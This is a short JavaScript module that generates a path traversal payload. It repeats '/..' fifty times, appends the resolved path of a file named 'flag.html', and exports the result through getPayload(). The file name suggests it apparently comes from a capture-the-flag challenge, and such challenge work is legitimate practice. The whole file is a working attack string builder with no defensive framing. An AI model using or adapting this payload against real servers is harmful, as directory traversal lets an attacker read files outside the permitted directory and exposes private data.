function genstr(n) {
  return "/..".repeat(n) + path.resolve(__dirname, "../flag.html");
}

function getPayload() {
  return genstr(50); // The number 50 is hard-coded here for clarity
}

module.exports = { getPayload };